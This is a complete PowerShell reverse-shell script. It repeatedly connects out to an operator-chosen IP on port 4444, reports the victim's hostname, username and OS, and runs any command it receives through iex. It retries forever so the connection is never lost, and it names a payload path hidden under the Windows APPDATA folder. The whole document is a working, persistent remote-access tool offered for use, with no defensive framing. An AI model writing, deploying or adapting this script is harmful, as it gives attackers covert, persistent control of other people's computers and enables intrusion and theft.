# reverse_shell.ps1 - Never disconnects, always reconnects
$serverIP = "192.168.1.4"  # ← UPDATE WITH YOUR ARCH IP
$serverPort = 4444
$reconnectDelay = 15  # Seconds to wait before reconnecting
$localPayloadPath = "$env:APPDATA\Microsoft\Windows\reverse_shell.ps1"

function Get-SystemInfo {
    $hostname = $env:COMPUTERNAME
    $username = $env:USERNAME
    $os = (Get-WmiObject Win32_OperatingSystem).Caption
    return "SYSINFO:$hostname|$username|$os"
}

# Main persistent loop (NEVER EXITS)
while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TCPClient
        $client.Connect($serverIP, $serverPort)
        
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.AutoFlush = $true
        $reader = New-Object System.IO.StreamReader($stream)
        
        # Send system info
        $writer.WriteLine((Get-SystemInfo))
        
        # Command execution loop (NEVER EXITS ON ERROR)
        while ($true) {
            try {
                $command = $reader.ReadLine()
                if (-not $command) { break }  # Server closed connection
                
                if ($command -eq "exit") { break }
                
                # Execute command (NEVER FAILS THE CONNECTION)
                $result = iex $command 2>&1 | Out-String
                $writer.Write($result)
            }
            catch {
                # Send error but KEEP CONNECTION ALIVE
                $errorOutput = "ERROR: $($_.Exception.Message)`n"
                $writer.Write($errorOutput)
            }
        }
    }
    catch {
        # Connection failed, but we'll retry
    }
    finally {
        if ($client) { $client.Close() }
    }
    
    # Wait before reconnecting
    Start-Sleep -Seconds $reconnectDelay
}
